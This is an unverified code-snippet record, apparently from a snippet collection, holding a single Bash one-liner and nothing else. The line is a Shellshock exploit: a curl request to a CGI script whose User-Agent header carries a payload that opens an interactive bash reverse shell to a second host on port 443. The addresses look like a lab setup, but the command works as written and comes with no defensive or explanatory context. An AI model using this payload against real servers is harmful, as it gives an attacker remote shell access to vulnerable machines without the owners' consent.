---
id: 8c4a1d1a-19ab-47e8-8a37-8d2dc9113df9
type: code
language: Bash
verified: false
created_at: '2020-03-16T07:07:50.217817+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 8c4a1d1a

**Language**: Bash

```bash
curl http://10.10.10.10/cgi-bin/user.sh -H 'User-Agent: () { :; }; /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.100/443 0>&1"'
```
